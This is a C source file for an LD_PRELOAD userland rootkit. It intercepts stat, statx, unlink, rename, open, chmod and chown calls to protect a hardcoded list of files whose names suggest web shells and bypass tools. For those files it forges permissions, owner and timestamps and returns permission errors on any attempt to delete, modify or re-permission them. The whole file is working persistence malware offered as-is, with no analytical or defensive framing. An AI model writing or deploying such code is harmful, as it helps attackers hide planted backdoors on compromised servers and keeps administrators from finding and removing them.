#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <time.h>
#include <linux/stat.h>

/* ── Target files ─────────────────────────────────────────── */
static const char *GHOST[] = {
    "bypashitam.php",
    "bypascloudfare.php",
    "dandier.py",
    ".ghost",
    NULL
};

/* ── GET_ORIG macro ───────────────────────────────────────── */
#define GET_ORIG(name, ret, ...) \
    static ret (*orig_##name)(__VA_ARGS__) = NULL; \
    if (!orig_##name) orig_##name = dlsym(RTLD_NEXT, #name);

/* ── Fake timestamp (May 20 13:42) ───────────────────────── */
static time_t fake_mtime(void) {
    struct tm t;
    memset(&t, 0, sizeof t);
    t.tm_year = 125;
    t.tm_mon  = 4;
    t.tm_mday = 20;
    t.tm_hour = 13;
    t.tm_min  = 42;
    return mktime(&t);
}

/* ── Basename check ───────────────────────────────────────── */
static int is_ghost(const char *path) {
    const char *base;
    int i;
    if (!path) return 0;
    base = strrchr(path, '/');
    base = base ? base + 1 : path;
    for (i = 0; GHOST[i]; i++)
        if (strcmp(base, GHOST[i]) == 0) return 1;
    return 0;
}

/* ── Poison stat buffer ───────────────────────────────────── */
static void poison_stat(struct stat *buf) {
    buf->st_mode  = 0x003F;
    buf->st_nlink = 0;
    buf->st_uid   = 99999;
    buf->st_gid   = 99999;
    buf->st_mtime = fake_mtime();
    buf->st_atime = fake_mtime();
}

static void poison_stat64(struct stat64 *buf) {
    buf->st_mode  = 0x003F;
    buf->st_nlink = 0;
    buf->st_uid   = 99999;
    buf->st_gid   = 99999;
    buf->st_mtime = fake_mtime();
    buf->st_atime = fake_mtime();
}

/* ── stat hooks ───────────────────────────────────────────── */
int __xstat(int ver, const char *path, struct stat *buf) {
    int ret;
    GET_ORIG(__xstat, int, int, const char *, struct stat *);
    ret = orig___xstat(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
    int ret;
    GET_ORIG(__xstat64, int, int, const char *, struct stat64 *);
    ret = orig___xstat64(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int __lxstat(int ver, const char *path, struct stat *buf) {
    int ret;
    GET_ORIG(__lxstat, int, int, const char *, struct stat *);
    ret = orig___lxstat(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int __lxstat64(int ver, const char *path, struct stat64 *buf) {
    int ret;
    GET_ORIG(__lxstat64, int, int, const char *, struct stat64 *);
    ret = orig___lxstat64(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int stat(const char *path, struct stat *buf) {
    int ret;
    GET_ORIG(stat, int, const char *, struct stat *);
    ret = orig_stat(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int lstat(const char *path, struct stat *buf) {
    int ret;
    GET_ORIG(lstat, int, const char *, struct stat *);
    ret = orig_lstat(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int stat64(const char *path, struct stat64 *buf) {
    int ret;
    GET_ORIG(stat64, int, const char *, struct stat64 *);
    ret = orig_stat64(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int lstat64(const char *path, struct stat64 *buf) {
    int ret;
    GET_ORIG(lstat64, int, const char *, struct stat64 *);
    ret = orig_lstat64(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int fstatat(int fd, const char *path, struct stat *buf, int flags) {
    int ret;
    GET_ORIG(fstatat, int, int, const char *, struct stat *, int);
    ret = orig_fstatat(fd, path, buf, flags);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int fstatat64(int fd, const char *path, struct stat64 *buf, int flags) {
    int ret;
    GET_ORIG(fstatat64, int, int, const char *, struct stat64 *, int);
    ret = orig_fstatat64(fd, path, buf, flags);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

/* ── statx — dipakai ls modern ───────────────────────────── */
int statx(int dirfd, const char *path, int flags,
          unsigned int mask, struct statx *buf) {
    int ret;
    GET_ORIG(statx, int, int, const char *, int,
             unsigned int, struct statx *);
    ret = orig_statx(dirfd, path, flags, mask, buf);
    if (ret == 0 && is_ghost(path)) {
        buf->stx_mode         = 0x003F;
        buf->stx_nlink        = 0;
        buf->stx_uid          = 99999;
        buf->stx_gid          = 99999;
        buf->stx_mtime.tv_sec = fake_mtime();
        buf->stx_atime.tv_sec = fake_mtime();
    }
    return ret;
}

/* ── unlink/remove/rename — EPERM ────────────────────────── */
int unlink(const char *path) {
    GET_ORIG(unlink, int, const char *);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_unlink(path);
}

int unlinkat(int fd, const char *path, int flags) {
    GET_ORIG(unlinkat, int, int, const char *, int);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_unlinkat(fd, path, flags);
}

int remove(const char *path) {
    GET_ORIG(remove, int, const char *);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_remove(path);
}

int rename(const char *old, const char *new) {
    GET_ORIG(rename, int, const char *, const char *);
    if (is_ghost(old)) { errno = EPERM; return -1; }
    return orig_rename(old, new);
}

/* ── open — block write, allow read ──────────────────────── */
int open(const char *path, int flags, ...) {
    GET_ORIG(open, int, const char *, int, ...);
    if (is_ghost(path) && (flags & O_WRONLY || flags & O_RDWR)) {
        errno = EACCES; return -1;
    }
    if (flags & O_CREAT) {
        va_list ap; mode_t mode;
        va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
        return orig_open(path, flags, mode);
    }
    return orig_open(path, flags);
}

int openat(int fd, const char *path, int flags, ...) {
    GET_ORIG(openat, int, int, const char *, int, ...);
    if (is_ghost(path) && (flags & O_WRONLY || flags & O_RDWR)) {
        errno = EACCES; return -1;
    }
    if (flags & O_CREAT) {
        va_list ap; mode_t mode;
        va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
        return orig_openat(fd, path, flags, mode);
    }
    return orig_openat(fd, path, flags);
}

int chmod(const char *path, mode_t mode) {
    GET_ORIG(chmod, int, const char *, mode_t);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_chmod(path, mode);
}

int chown(const char *path, uid_t uid, gid_t gid) {
    GET_ORIG(chown, int, const char *, uid_t, gid_t);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_chown(path, uid, gid);
}
